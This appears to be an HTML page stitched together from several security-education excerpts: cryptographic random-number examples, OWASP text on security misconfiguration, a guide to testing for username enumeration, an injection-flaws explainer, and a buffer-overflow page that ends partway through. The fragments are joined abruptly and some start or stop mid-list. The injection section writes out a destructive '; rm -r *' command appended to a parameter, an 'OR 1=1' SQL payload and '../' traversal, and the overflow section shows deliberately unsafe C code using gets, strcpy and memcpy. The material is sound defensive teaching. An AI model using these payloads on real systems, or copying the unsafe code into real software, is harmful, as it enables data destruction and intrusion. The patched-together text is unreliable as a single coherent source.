        <li><strong>Random Number Generators (RNGs):</strong> RNGs are functions that generate random numbers. In cryptography, RNGs must be unpredictable and resistant to attacks, ensuring the randomness of keys and nonces.</li>
        <li><strong>Secure RNGs in Libraries:</strong> Libraries like OpenSSL and Crypto++ offer built-in functions to generate cryptographically secure random values. They use system entropy and hardware sources to enhance randomness.</li>
    </ul>

    <h3>Examples of Cryptographic Random Functions:</h3>
    <p>Below are examples of how cryptographic random functions are used in different programming languages:</p>

    <h4>1. Python Example (Using `secrets` Module)</h4>
    <pre>
import secrets

# Generate a cryptographically secure random number
random_number = secrets.randbelow(100)  # Random number between 0 and 99

# Generate a random 16-byte token
random_token = secrets.token_bytes(16)

print("Random Number:", random_number)
print("Random Token:", random_token)
    </pre>
    <p>The `secrets` module in Python provides cryptographically secure random numbers. The `randbelow()` function generates a random number within a specified range, and `token_bytes()` generates a random token of the desired length.</p>

    <h4>2. JavaScript Example (Using `crypto` Module)</h4>
    <pre>
const crypto = require('crypto');

// Generate a random 16-byte buffer
const randomBuffer = crypto.randomBytes(16);

console.log("Random Buffer:", randomBuffer.toString('hex'));
    </pre>
    <p>The `crypto` module in Node.js provides `randomBytes()` to generate secure random values in the form of a buffer, which can be used for cryptographic purposes like session tokens or keys.</p>

    <h4>3. OpenSSL Command Line Example</h4>
    <pre>
# Generate a 16-byte random number
openssl rand -hex 16
    </pre>
    <p>OpenSSL provides the `rand` command to generate random numbers, which can be used for keys or initialization vectors in cryptographic applications. The `-hex` option outputs the random number as a hexadecimal string.</p>

    <h2>Key Concepts in Cryptographic Random Functions</h2>
    <ul>
        <li><strong>Entropy:</strong> Entropy refers to the level of unpredictability in a random number. High entropy is necessary to ensure that random values are not predictable by an attacker. Cryptographic systems rely on high-entropy sources, such as hardware random number generators, to generate secure random values.</li>
        <li><strong>Seed Value:</strong> Cryptographic random functions often start with an initial "seed" value, which is used to generate random numbers. The seed value must be unpredictable to ensure the security of the random numbers generated.</li>
        <li><strong>Deterministic vs Non-Deterministic Generators:</strong> Deterministic random functions, like CSPRNGs, use a seed and an algorithm to generate random numbers. Non-deterministic generators, often used in hardware-based random number generators, rely on unpredictable physical phenomena to generate randomness.</li>
        <li><strong>Forward Secrecy:</strong> Forward secrecy ensures that even if a key or session is compromised in the future, past communications remain secure. This is achieved by using unique, short-lived cryptographic keys that are generated randomly for each session.</li>
    </ul>

    <h2>Common Attacks on Randomness</h2>
    <p>Weak or predictable random number generation can lead to severe vulnerabilities in cryptographic systems. Some common attacks include:</p>
    <ul>
        <li><strong>Predictable Random Numbers:</strong> If an attacker can predict the random numbers generated by a system, they can predict cryptographic keys, session tokens, or other secrets, leading to a compromise.</li>
        <li><strong>Low Entropy Sources:</strong> Using a source of randomness with low entropy (e.g., system time or user input) can make the generated numbers predictable and weak against brute-force or guessing attacks.</li>
        <li><strong>Seed Prediction:</strong> If an attacker can guess or predict the seed value used to generate random numbers, they can predict the entire sequence of random numbers that follow, allowing them to break encryption or impersonate users.</li>
    </ul>

    <h2>Best Practices for Using Cryptographic Random Functions</h2>
    <ul>
        <li><strong>Use Secure Libraries:</strong> Always use trusted cryptographic libraries (e.g., OpenSSL, Python `secrets`, or Node.js `crypto`) that are designed to generate secure random numbers.</li>
        <li><strong>Use Hardware-Based RNGs:</strong> Where possible, use hardware-based random number generators (e.g., Intel’s RDRAND) for improved security and entropy.</li>
        <li><strong>Ensure High Entropy:</strong> Make sure that the sources of entropy used by the RNG are unpredictable and resistant to attacks. Avoid using sources like the system clock or user input.</li>
        <li><strong>Never Reuse Nonces or Keys:</strong> Ensure that nonces, session tokens, and cryptographic keys are not reused across sessions, as reuse can expose the system to attack.</li>
    </ul>

        <h4>Moving up from #6 in the previous edition, 90% of applications were tested for some form of misconfiguration, with an average incidence rate of 4.%, and over 208k occurrences of a Common Weakness Enumeration (CWE) in this risk category. With more shifts into highly configurable software, it's not surprising to see this category move up. Notable CWEs included are <em>CWE-16 Configuration</em> and <em>CWE-611 Improper Restriction of XML External Entity Reference</em>.</h4>
        <h2 id="description">Description</h2>
        <p>The application might be vulnerable if the application is:</p>
        <ul>
        <li>
        <p>Missing appropriate security hardening across any part of the application stack or improperly configured permissions on cloud services.</p>
        </li>
        <li>
        <p>Unnecessary features are enabled or installed (e.g., unnecessary ports, services, pages, accounts, or privileges).</p>
        </li>
        <li>
        <p>Default accounts and their passwords are still enabled and unchanged.</p>
        </li>
        <li>
        <p>Error handling reveals stack traces or other overly informative error messages to users.</p>
        </li>
        <li>
        <p>For upgraded systems, the latest security features are disabled or not configured securely.</p>
        </li>
        <li>
        <p>The security settings in the application servers, application frameworks (e.g., Struts, Spring, ASP.NET), libraries, databases, etc., are not set to secure values.</p>
        </li>
        <li>
        <p>The server does not send security headers or directives, or they are not set to secure values.</p>
        </li>
        <li>
        <p>The software is out of date or vulnerable (see <a href="https://owasp.org/Top10/A06_2021-Vulnerable_and_Outdated_Components/">A06:2021-Vulnerable and Outdated Components</a>).</p>
        </li>
        </ul>
        <p>Without a concerted, repeatable application security configuration process, systems are at a higher risk.</p>
        <h2 id="how-to-prevent">How to Prevent</h2>
        <p>Secure installation processes should be implemented, including:</p>
        <ul>
        <li>
        <p>A repeatable hardening process makes it fast and easy to deploy another environment that is appropriately locked down. Development, QA, and production environments should all be configured identically, with different credentials used in each environment. This process should be automated to minimize the effort required to set up a new secure environment.</p>
        </li>
        <li>
        <p>A minimal platform without any unnecessary features, components, documentation, and samples. Remove or do not install unused features and frameworks.</p>
        </li>
        <li>
        <p>A task to review and update the configurations appropriate to all security notes, updates, and patches as part of the patch management process (see <a href="https://owasp.org/Top10/A06_2021-Vulnerable_and_Outdated_Components/">A06:2021-Vulnerable and Outdated Components</a>). Review cloud storage permissions (e.g., S3 bucket permissions).</p>
        </li>
        <li>
        <p>A segmented application architecture provides effective and secure separation between components or tenants, with segmentation, containerization, or cloud security groups (ACLs).</p>
        </li>
        <li>
        <p>Sending security directives to clients, e.g., Security Headers.</p>
        </li>
        <li>
        <p>An automated process to verify the effectiveness of the configurations and settings in all environments.</p>
        </li>
        </ul>
        <h2 id="example-attack-scenarios">Example Attack Scenarios</h2>
        <p><strong>Scenario #1:</strong> The application server comes with sample applications not removed from the production server. These sample applications have known security flaws attackers use to compromise the server. Suppose one of these applications is the admin console, and default accounts weren't changed. In that case, the attacker logs in with default passwords and takes over.</p>
        <p><strong>Scenario #2:</strong> Directory listing is not disabled on the server. An attacker discovers they can simply list directories. The attacker finds and downloads the compiled Java classes, which they decompile and reverse engineer to view the code. The attacker then finds a severe access control flaw in the application.</p>
        <p><strong>Scenario #3:</strong> The application server's configuration allows detailed error messages, e.g., stack traces, to be returned to users. This potentially exposes sensitive information or underlying flaws such as component versions that are known to be vulnerable.</p>
        <p><strong>Scenario #4:</strong> A cloud service provider (CSP) has default sharing permissions open to the Internet by other CSP users. This allows sensitive data stored within cloud storage to be accessed.</p>

        </br>
        <h4>The scope of this test is to verify if it is possible to collect a set of valid usernames by interacting with the authentication mechanism of the application. This test will be useful for brute force testing, in which the tester verifies if, given a valid username, it is possible to find the corresponding password.</h4>
        <p>Often, web applications reveal when a username exists on system, either as a consequence of mis-configuration or as a design decision. For example, sometimes, when we submit wrong credentials, we receive a message that states that either the username is present on the system or the provided password is wrong. The information obtained can be used by an attacker to gain a list of users on system. This information can be used to attack the web application, for example, through a brute force or default username and password attack.</p>
        <p>The tester should interact with the authentication mechanism of the application to understand if sending particular requests causes the application to answer in different manners. This issue exists because the information released from web application or web server when the user provide a valid username is different than when they use an invalid one.</p>
        <p>In some cases, a message is received that reveals if the provided credentials are wrong because an invalid username or an invalid password was used. Sometimes, testers can enumerate the existing users by sending a username and an empty password.</p>
        <h2 id="test-objectives">Test Objectives</h2>
        <ul>
        <li>Review processes that pertain to user identification (<em>e.g.</em> registration, login, etc.).</li>
        <li>Enumerate users where possible through response analysis.</li>
        </ul>
        <h2 id="how-to-test">How to Test</h2>
        <p>In black-box testing, the tester knows nothing about the specific application, username, application logic, error messages on log in page, or password recovery facilities. If the application is vulnerable, the tester receives a response message that reveals, directly or indirectly, some information useful for enumerating users.</p>
        <h3 id="http-response-message">HTTP Response Message</h3>
        <h4 id="testing-for-valid-credentials">Testing for Valid Credentials</h4>
        <p>Record the server answer when you submit a valid user ID and valid password.</p>
        <blockquote>
        <p>Using a web proxy, notice the information retrieved from this successful authentication (HTTP 200 Response, length of the response).</p>
        </blockquote>
        <h4 id="testing-for-valid-user-with-wrong-password">Testing for Valid User with Wrong Password</h4>
        <p>Now, the tester should try to insert a valid user ID and a wrong password and record the error message generated by the application.</p>
        <blockquote>
        <p>The browser should display a message similar to the following one:</p>
        <p><img src="https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/03-Identity_Management_Testing/images/AuthenticationFailed.png" alt="Authentication Failed" /><br /> <em>Figure 4.3.4-1: Authentication Failed</em></p>
        <p>Unlike any message that reveals the existence of the user like the following:</p>
        <p><code class="language-plaintext highlighter-rouge">Login for User foo: invalid password</code></p>
        <p>Using a web proxy, notice the information retrieved from this unsuccessful authentication attempt (HTTP 200 Response, length of the response).</p>
        </blockquote>
        <h4 id="testing-for-a-nonexistent-username">Testing for a Nonexistent Username</h4>
        <p>Now, the tester should try to insert an invalid user ID and a wrong password and record the server answer (the tester should be confident that the username is not valid in the application). Record the error message and the server answer.</p>
        <blockquote>
        <p>If the tester enters a nonexistent user ID, they can receive a message similar to:</p>
        <p><img src="https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/03-Identity_Management_Testing/images/Userisnotactive.png" alt="This User is Not Active" /><br /> <em>Figure 4.3.4-3: This User is Not Active</em></p>
        <p>or a message like the following one:</p>
        <p><code class="language-plaintext highlighter-rouge">Login&nbsp;failed&nbsp;for&nbsp;User&nbsp;foo:&nbsp;invalid&nbsp;Account</code></p>
        <p>Generally the application should respond with the same error message and length to the different incorrect requests. If the responses are not the same, the tester should investigate and find out the key that creates a difference between the two responses. For example:</p>
        <ol>
        <li>Client request: Valid user/wrong password</li>
        <li>Server response: The password is not correct</li>
        <li>Client request: Wrong user/wrong password</li>
        <li>Server response: User not recognized</li>
        </ol>
        <p>The above responses let the client understand that for the first request they have a valid username. So they can interact with the application requesting a set of possible user IDs and observing the answer.</p>
        <p>Looking at the second server response, the tester understand in the same way that they don&rsquo;t hold a valid username. So they can interact in the same manner and create a list of valid user ID looking at the server answers.</p>
        </blockquote>
        <h3 id="other-ways-to-enumerate-users">Other Ways to Enumerate Users</h3>
        <p>Testers can enumerate users in several ways, such as:</p>
        <h4 id="analyzing-the-error-code-received-on-login-pages">Analyzing the Error Code Received on Login Pages</h4>
        <p>Some web application release a specific error code or message that we can analyze.</p>
        <h4 id="analyzing-urls-and-url-redirections">Analyzing URLs and URL Redirections</h4>
        <p>For example:</p>
        <ul>
        <li><code class="language-plaintext highlighter-rouge">http://www.foo.com/err.jsp?User=baduser&amp;Error=0</code></li>
        <li><code class="language-plaintext highlighter-rouge">http://www.foo.com/err.jsp?User=gooduser&amp;Error=2</code></li>
        </ul>
        <p>As is seen above, when a tester provides a user ID and password to the web application, they see a message indication that an error has occurred in the URL. In the first case they have provided a bad user ID and bad password. In the second, a good user ID and a bad password, so they can identify a valid user ID.</p>
        <h4 id="uri-probing">URI Probing</h4>
        <p>Sometimes a web server responds differently if it receives a request for an existing directory or not. For instance in some portals every user is associated with a directory. If testers try to access an existing directory they could receive a web server error.</p>
        <p>Some of the common errors received from web servers are:</p>
        <ul>
        <li>403 Forbidden error code</li>
        <li>404 Not found error code</li>
        </ul>
        <p>Example:</p>
        <ul>
        <li><code class="language-plaintext highlighter-rouge">http://www.foo.com/account1</code> - we receive from web server: 403 Forbidden</li>
        <li><code class="language-plaintext highlighter-rouge">http://www.foo.com/account2</code>&nbsp;-&nbsp;we&nbsp;receive&nbsp;from&nbsp;web&nbsp;server:&nbsp;404&nbsp;file&nbsp;Not&nbsp;Found</li>
        </ul>
        <p>In the first case the user exists, but the tester cannot view the web page, in second case instead the user &ldquo;account2&rdquo; does not exist. By collecting this information testers can enumerate the users.</p>
        <h4 id="analyzing-web-page-titles">Analyzing Web Page Titles</h4>
        <p>Testers can receive useful information on Title of web page, where they can obtain a specific error code or messages that reveal if the problems are with the username or password.</p>
        <p>For instance, if a user cannot authenticate to an application and receives a web page whose title is similar to:</p>
        <ul>
        <li><code class="language-plaintext highlighter-rouge">Invalid&nbsp;user</code></li>
        <li><code class="language-plaintext highlighter-rouge">Invalid&nbsp;authentication</code></li>
        </ul>
        <h4 id="analyzing-a-message-received-from-a-recovery-facility">Analyzing a Message Received from a Recovery Facility</h4>
        <p>When we use a recovery facility (i.e. a forgotten password function) a vulnerable application might return a message that reveals if a username exists or not.</p>
        <p>For example, messages similar to the following:</p>
        <ul>
        <li><code class="language-plaintext highlighter-rouge">Invalid username: email address is not valid or the specified user was not found.</code></li>
        <li><code class="language-plaintext highlighter-rouge">Valid&nbsp;username:&nbsp;Your&nbsp;password&nbsp;has&nbsp;been&nbsp;successfully&nbsp;sent&nbsp;to&nbsp;the&nbsp;email&nbsp;address&nbsp;you&nbsp;registered&nbsp;with.</code></li>
        </ul>
        <h4 id="friendly-404-error-message">Friendly 404 Error Message</h4>
        <p>When we request a user within the directory that does not exist, we don&rsquo;t always receive 404 error code. Instead, we may receive &ldquo;200 OK&rdquo; with an image, in this case we can assume that when we receive the specific image the user does not exist. This logic can be applied to other web server response; the trick is a good analysis of web server and web application messages.</p>
        <h4 id="analyzing-response-times">Analyzing Response Times</h4>
        <p>As well as looking at the content of the responses, the time that the response takes should also be considered. Particularly where the request causes an interaction with an external service (such as sending a forgotten password email), this can add several hundred milliseconds to the response, which can be used to determine whether the requested user is valid.</p>
        <h3 id="guessing-users">Guessing Users</h3>
        <p>In some cases the user IDs are created with specific policies of administrator or company. For example we can view a user with a user ID created in sequential order:</p>
        <div class="language-text highlighter-rouge">
        <div class="highlight">
        <pre class="highlight"><code>CN000100
        CN000101
        ...
        </code></pre>
        </div>
        </div>
        <p>Sometimes the usernames are created with a REALM alias and then a sequential numbers:</p>
        <ul>
        <li>R1001 &ndash; user 001 for REALM1</li>
        <li>R2001 &ndash; user 001 for REALM2</li>
        </ul>
        <p>In the above sample we can create simple shell scripts that compose user IDs and submit a request with tool like wget to automate a web query to discern valid user IDs. To create a script we can also use Perl and curl.</p>
        <p>Other possibilities are: - user IDs associated with credit card numbers, or in general numbers with a pattern. - user IDs associated with real names, e.g. if Freddie Mercury has a user ID of &ldquo;fmercury&rdquo;, then you might guess Roger Taylor to have the user ID of &ldquo;rtaylor&rdquo;.</p>
        <p>Again, we can guess a username from the information received from an LDAP query or from Google information gathering, for example, from a specific domain. Google can help to find domain users through specific queries or through a simple shell script or tool.</p>
        <blockquote>
        <p>By enumerating user accounts, you risk locking out accounts after a predefined number of failed probes (based on application policy). Also, sometimes, your IP address can be banned by dynamic rules on the application firewall or Intrusion Prevention System.</p>
        </blockquote>
        <h3 id="testing-staff-impersonation">Testing Staff Impersonation</h3>
        <p>Ensure that unregistered users are unable to select reserved usernames (e.g., admin, administrator, moderator) during the registration process. Additionally, verify that users cannot edit their current username to one of these reserved usernames on the profile editing page.</p>
        <p>If the web application has features that allow a user to access the web application&rsquo;s registration and profile editing functionality, the interactions to test include the following:</p>
        <ul>
        <li>Registration process:
        <ul>
        <li>Access the registration page as an unregistered user and fill in the registration form, entering one of the reserved usernames (e.g., admin, administrator, moderator), submit the registration form, and then verify the response.</li>
        <li>The registration process should reject the form submission and display an error message indicating that the selected username is not available for registration.</li>
        </ul>
        </li>
        <li>Profile editing page:
        <ul>
        <li>Log into the web application using valid credentials and navigate to the profile editing page. Attempt to change the current username to one of the reserved usernames (e.g., admin, administrator, moderator) and save the changes to verify the behavior.</li>
        <li>The profile editing process should reject the username change request and display an error message indicating that the selected username is not available.</li>
        </ul>
        </li>
        <li>Test for variants and similarities:
        <ul>
        <li>Repeat the above steps for different variations of the reserved usernames (e.g., Admin, ADMIN, Administrator) and perform tests with different combinations of uppercase and lowercase letters to ensure case insensitivity is handled correctly.</li>
        <li>The web application should treat these variants as identical to the reserved usernames, rejecting their selection or modification.</li>
        </ul>
        </li>
        </ul>
        <h3 id="gray-box-testing">Gray-Box Testing</h3>
        <h4 id="testing-for-authentication-error-messages">Testing for Authentication Error Messages</h4>
        <p>Verify that the application answers in the same manner for every client request that produces a failed authentication. For this issue the black-box testing and gray-box testing have the same concept based on the analysis of messages or error codes received from web application.</p>
        <blockquote>
        <p>The application should answer in the same manner for every failed attempt of authentication.</p>
        <p>For Example: <em>Credentials submitted are not valid</em></p>
        </blockquote>
        <h2 id="remediation">Remediation</h2>
        <p>Ensure the application returns consistent generic error messages in response to invalid account name, password or other user credentials entered during the log in process.</p>
        <p>Ensure default system accounts and test accounts are deleted prior to releasing the system into production (or exposing it to an untrusted network).</p>

    <p>An injection flaw is a vulnerability which allows an attacker to relay malicious code through an application to another system. This can include compromising both backend systems as well as other clients connected to the vulnerable application.</p>
    <p>The effects of these attacks include:</p>
    <ul>
    <li>Allowing an attacker to execute operating system calls on a target machine</li>
    <li>Allowing an attacker to compromise backend data stores</li>
    <li>Allowing an attacker to compromise or hijack sessions of other users</li>
    <li>Allowing an attacker to force actions on behalf of other users or services</li>
    </ul>
    <p>Many web applications depend on operating system features, external programs, and processing of data queries submitted by users. When a web application passes information from an HTTP request as part of an external request, set up a way to scrub and validate the message. Otherwise an attacker can inject special (meta) characters, malicious commands/code, or command modifiers into the message.</p>
    <p>While these attacks are not difficult to attempt, there are an increasing number of tools that scan for these flaws. An attacker can use these techniques to obtain, corrupt, or destroy the contents of your database, compromise backend systems, or attack other users.</p>
    <p>Successful injection attacks may completely compromise or destroy a system. It is important to test for and protect against these types of attacks.</p>
    <h2 id="examples">Examples</h2>
    <ol>
    <li>
    <p>OS Command Injection - A malicious parameter could modify the actions taken by a system call that normally retrieves the current user&rsquo;s file to access another user&rsquo;s file (e.g., by including path traversal <code class="language-plaintext highlighter-rouge">../</code> characters as part of a filename request). Additional commands could be tacked on to the end of a parameter that is passed to a shell script to execute an additional shell command (e.g., <code class="language-plaintext highlighter-rouge">; rm &ndash;r \*</code>) along with the intended command.</p>
    </li>
    <li>
    <p>SQL Injection - Is a particularly widespread and dangerous form of injection. To exploit a SQL injection flaw, an attacker needs to find a parameter that the web application passes through to a database interaction. An attacker can then embed malicious SQL commands into the content of the parameter, to trick the web application to forward a malicious query to the database. SQL queries could be modified by adding additional &lsquo;constraints&rsquo; to a where clause (e.g., <code class="language-plaintext highlighter-rouge">OR 1=1</code>) to gain access to or modify unauthorized data.</p>
    </li>
    <li>
    <p>Cross-Site Scripting (XSS) - A type of injection, in which malicious scripts are injected into otherwise benign and trusted websites. XSS attacks occur when an attacker uses a web application to send malicious code, generally in the form of a browser side script, to a different end user.<sup>1</sup> Attacks of this type can hijack user sessions, log keystrokes, or perform malicious actions on behalf of victim users.</p>
    </li>
    </ol>
    <h2 id="how-to-determine-if-you-are-vulnerable">How to Determine If You Are Vulnerable</h2>
    <p>The best way to determine if your applications are vulnerable to injection attacks is to search the source code for all calls to external resources (e.g., system, exec, fork, Runtime.exec, SQL queries, XML and JSON parsers, or whatever the syntax is for making requests to interpreters in your environment). Additionally, validate that all user provided input is sanitized and user provided data that is output is properly encoded where applicable.</p>
    <p><a href="https://owasp.org/www-project-web-security-testing-guide">OWASP Web Security Testing Guide</a> contains details on how to test for common injection attacks. See the References section below for additional information.</p>
    <h2 id="how-to-protect-yourself">How to Protect Yourself</h2>
    <ol>
    <li>Validate Input</li>
    </ol>
    <p>Input validation is performed to ensure only properly formed data is entering the workflow in an information system, preventing malformed data from persisting in the database and triggering malfunction of various downstream components. Input validation should happen as early as possible in the data flow, preferably as soon as the data is received from the external party.</p>
    <p>Data from all potentially untrusted sources should be subject to input validation, including not only Internet-facing web clients but also backend feeds over extranets, from suppliers, partners, vendors or regulators, each of which may be compromised on their own and start sending malformed data.</p>
    <p>Input Validation should not be used as the primary method of preventing XSS, SQL Injection, and other attacks which are covered in respective cheat sheets but can significantly contribute to reducing their impact if implemented properly.<sup>2</sup></p>
    <ol>
    <li>Apply Least Privilege</li>
    </ol>
    <p>Another strong protection against injection attacks is to ensure that the web application runs with only the privileges it absolutely needs to perform its function. So you should not run the webserver as root or access a database as DBADMIN, otherwise an attacker can abuse these administrative privileges granted to the web application. Some of the J2EE environments allow the use of the Java sandbox, which can prevent the execution of system commands.</p>
    <ol>
    <li>Handle Exceptions and Returned Status Codes</li>
    </ol>
    <p>If an external command must be used, any user information that is being inserted into the command should be rigorously checked. Mechanisms should be put in place to handle any possible errors, timeouts, or blockages during the call. All output, return codes and error codes from the call should be checked to ensure that the expected processing actually occurred. At a minimum, this will allow you to determine that something has gone wrong. Otherwise, the attack may occur and never be detected.</p>
    <ol>
    <li>Investigate Mitigation Techniques for Specific Technologies Your Application Uses</li>
    </ol>
    <p>Different injection attack types require different mitigation strategies (e.g. XSS vs. Server-side template injection). Review what technologies your application uses and available information on steps to take on preventing attack classes that abuse those technologies.</p>
    <ol>
    <li>Avoid Accessing External Interpreters</li>
    </ol>
    <p>Another way to protect against injection is to avoid accessing external interpreters wherever possible. For many shell commands and some system calls, there are language specific libraries that perform the same functions. Using such libraries does not involve the operating system shell interpreter, and therefore avoids a large number of problems with shell commands.</p>

        <h2 id="overview">Overview</h2>
        <p>A buffer overflow condition exists when a program attempts to put more data in a buffer than it can hold or when a program attempts to put data in a memory area past a buffer. In this case, a buffer is a sequential section of memory allocated to contain anything from a character string to an array of integers. Writing outside the bounds of a block of allocated memory can corrupt data, crash the program, or cause the execution of malicious code.</p>

        <p><a href="https://cwe.mitre.org/data/definitions/788.html">CWE-788: Access of Memory Location After End of Buffer</a>: This typically occurs when a pointer or its index is incremented to a position after the buffer; or when pointer arithmetic results in a position after the buffer.</p>
        </blockquote>
        <h2 id="description">Description</h2>
        <p>Buffer overflow is probably the best known form of software security vulnerability. Most software developers know what a buffer overflow vulnerability is, but buffer overflow attacks against both legacy and newly-developed applications are still quite common. Part of the problem is due to the wide variety of ways buffer overflows can occur, and part is due to the error-prone techniques often used to prevent them.</p>
        <p>Buffer overflows are not easy to discover and even when one is discovered, it is generally extremely difficult to exploit. Nevertheless, attackers have managed to identify buffer overflows in a staggering array of products and components.</p>
        <p>In a classic buffer overflow exploit, the attacker sends data to a program, which it stores in an undersized stack buffer. The result is that information on the call stack is overwritten, including the function&rsquo;s return pointer. The data sets the value of the return pointer so that when the function returns, it transfers control to malicious code contained in the attacker&rsquo;s data.</p>
        <p>Although this type of stack buffer overflow is still common on some platforms and in some development communities, there are a variety of other types of buffer overflow, including Heap buffer overflow and Off-by-one Error among others. Another very similar class of flaws is known as <a href="https://owasp.org/www-community/attacks/Format_string_attack">Format string attack</a>. There are a number of excellent books that provide detailed information on how buffer overflow attacks work, including Building Secure Software [1], Writing Secure Code [2], and The Shellcoder&rsquo;s Handbook [3].</p>
        <p>At the code level, buffer overflow vulnerabilities usually involve the violation of a programmer&rsquo;s assumptions. Many memory manipulation functions in C and C++ do not perform bounds checking and can easily overwrite the allocated bounds of the buffers they operate upon. Even bounded functions, such as strncpy(), can cause vulnerabilities when used incorrectly. The combination of memory manipulation and mistaken assumptions about the size or makeup of a piece of data is the root cause of most buffer overflows.</p>
        <p>Buffer overflow vulnerabilities typically occur in code that:</p>
        <ul>
        <li>Relies on external data to control its behavior</li>
        <li>Depends upon properties of the data that are enforced outside of the immediate scope of the code</li>
        <li>Is so complex that a programmer cannot accurately predict its behavior</li>
        </ul>
        <h3 id="buffer-overflow-and-web-applications">Buffer Overflow and Web Applications</h3>
        <p>Attackers use buffer overflows to corrupt the execution stack of a web application. By sending carefully crafted input to a web application, an attacker can cause the web application to execute arbitrary code &ndash; effectively taking over the machine.</p>
        <p>Buffer overflow flaws can be present in both the web server or application server products that serve the static and dynamic aspects of the site, or the web application itself. Buffer overflows found in widely used server products are likely to become widely known and can pose a significant risk to users of these products. When web applications use libraries, such as a graphics library to generate images, they open themselves to potential buffer overflow attacks.</p>
        <p>Buffer overflows can also be found in custom web application code, and may even be more likely given the lack of scrutiny that web applications typically go through. Buffer overflow flaws in custom web applications are less likely to be detected because there will normally be far fewer hackers trying to find and exploit such flaws in a specific application. If discovered in a custom application, the ability to exploit the flaw (other than to crash the application) is significantly reduced by the fact that the source code and detailed error messages for the application are normally not available to the hacker.</p>
        <h3 id="consequences">Consequences</h3>
        <ul>
        <li>Category:Availability: Buffer overflows generally lead to crashes. Other attacks leading to lack of availability are possible, including putting the program into an infinite loop.</li>
        <li>Access control (instruction processing): Buffer overflows often can be used to execute arbitrary code, which is usually outside the scope of a program&rsquo;s implicit security policy.</li>
        <li>Other: When the consequence is arbitrary code execution, this can often be used to subvert any other security service.</li>
        </ul>
        <h3 id="exposure-period">Exposure period</h3>
        <ul>
        <li>Requirements specification: The choice could be made to use a language that is not susceptible to these issues.</li>
        <li>Design: Mitigating technologies such as safe-string libraries and container abstractions could be introduced.</li>
        <li>Implementation: Many logic errors can lead to this condition. It can be exacerbated by lack of or mis&not;use of mitigating technologies.</li>
        </ul>
        <h3 id="environments-affected">Environments Affected</h3>
        <p>Almost all known web servers, application servers, and web application environments are susceptible to buffer overflows, the notable exception being environments written in interpreted languages like Java or Python, which are immune to these attacks (except for overflows in the Interpretor itself).</p>
        <h3 id="platform">Platform</h3>
        <ul>
        <li>Languages: C, C++, Fortran, Assembly</li>

        <p>For server products and libraries, keep up with the latest bug reports for the products you are using. For custom application software, all code that accepts input from users via the HTTP request must be reviewed to ensure that it can properly handle arbitrarily large input.</p>
        <h3 id="how-to-protect-yourself">How to Protect Yourself</h3>
        <p>Keep up with the latest bug reports for your web and application server products and other products in your Internet infrastructure. Apply the latest patches to these products. Periodically scan your web site with one or more of the commonly available scanners that look for buffer overflow flaws in your server products and your custom web applications. For your custom application code, you need to review all code that accepts input from users via the HTTP request and ensure that it provides appropriate size checking on all such inputs. This should be done even for environments that are not susceptible to such attacks as overly large inputs that are uncaught may still cause denial of service or other operational problems.</p>
        <h2 id="risk-factors">Risk Factors</h2>
        <p>TBD</p>
        <h2 id="examples">Examples</h2>
        <h3 id="example-1a">Example 1.a</h3>
        <p>The following sample code demonstrates a simple buffer overflow that is often caused by the first scenario in which the code relies on external data to control its behavior. The code uses the gets() function to read an arbitrary amount of data into a stack buffer. Because there is no way to limit the amount of data read by this function, the safety of the code depends on the user to always enter fewer than BUFSIZE characters.</p>
        <div class="language-plaintext highlighter-rouge">
        <div class="highlight">
        <pre class="highlight"><code>...
        char buf[BUFSIZE];
        gets(buf);
        ...
        </code></pre>
        </div>
        </div>
        <h3 id="example-1b">Example 1.b</h3>
        <p>This example shows how easy it is to mimic the unsafe behavior of the gets() function in C++ by using the <code class="language-plaintext highlighter-rouge">&gt;&gt;</code> operator to read input into a <code class="language-plaintext highlighter-rouge">char[]</code> string.</p>
        <div class="language-plaintext highlighter-rouge">
        <div class="highlight">
        <pre class="highlight"><code>...
        char buf[BUFSIZE];
        cin &gt;&gt; (buf);
        ...
        </code></pre>
        </div>
        </div>
        <h3 id="example-2">Example 2</h3>
        <p>The code in this example also relies on user input to control its behavior, but it adds a level of indirection with the use of the bounded memory copy function memcpy(). This function accepts a destination buffer, a source buffer, and the number of bytes to copy. The input buffer is filled by a bounded call to read(), but the user specifies the number of bytes that memcpy() copies.</p>
        <div class="language-plaintext highlighter-rouge">
        <div class="highlight">
        <pre class="highlight"><code>...
        char buf[64], in[MAX_SIZE];
        printf("Enter buffer contents:\n");
        read(0, in, MAX_SIZE-1);
        printf("Bytes to copy:\n");
        scanf("%d", &amp;bytes);
        memcpy(buf, in, bytes);
        ...
        </code></pre>
        </div>
        </div>
        <p><strong>Note:</strong> This type of buffer overflow vulnerability (where a program reads data and then trusts a value from the data in subsequent memory operations on the remaining data) has turned up with some frequency in image, audio, and other file processing libraries.</p>
        <h3 id="example-3">Example 3</h3>
        <p>This is an example of the second scenario in which the code depends on properties of the data that are not verified locally. In this example a function named <code class="language-plaintext highlighter-rouge">lccopy()</code> takes a string as its argument and returns a heap-allocated copy of the string with all uppercase letters converted to lowercase. The function performs no bounds checking on its input because it expects str to always be smaller than <code class="language-plaintext highlighter-rouge">BUFSIZE</code>. If an attacker bypasses checks in the code that calls <code class="language-plaintext highlighter-rouge">lccopy()</code>, or if a change in that code makes the assumption about the size of str untrue, then <code class="language-plaintext highlighter-rouge">lccopy()</code> will overflow buf with the unbounded call to <code class="language-plaintext highlighter-rouge">strcpy()</code>.</p>
        <div class="language-plaintext highlighter-rouge">
        <div class="highlight">
        <pre class="highlight"><code>char *lccopy(const char *str) {
          char buf[BUFSIZE];
          char *p;

          strcpy(buf, str);
          for (p = buf; *p; p++) {
            if (isupper(*p)) {
              *p = tolower(*p);
            }
          }
          return strdup(buf);
        }
        </code></pre>
        </div>
        </div>
        <h3 id="example-4">Example 4</h3>
        <p>The following code demonstrates the third scenario in which the code is so complex its behavior cannot be easily predicted. This code is from the popular libPNG image decoder, which is used by a wide array of applications, including Mozilla and some versions of Internet Explorer.</p>
        <p>The code appears to safely perform bounds checking because it checks the size of the variable length, which it later uses to control the amount of data copied by <code class="language-plaintext highlighter-rouge">png_crc_read()</code>. However, immediately before it tests length, the code performs a check on <code class="language-plaintext highlighter-rouge">png_ptr-&gt;mode</code>, and if this check fails a warning is issued and processing continues. Because length is tested in an else if block, length would not be tested if the first check fails, and is used blindly in the call to <code class="language-plaintext highlighter-rouge">png_crc_read()</code>, potentially allowing a stack buffer overflow.</p>
        <p>Although the code in this example is not the most complex we have seen, it demonstrates why complexity should be minimized in code that performs memory operations.</p>
        <div class="language-plaintext highlighter-rouge">
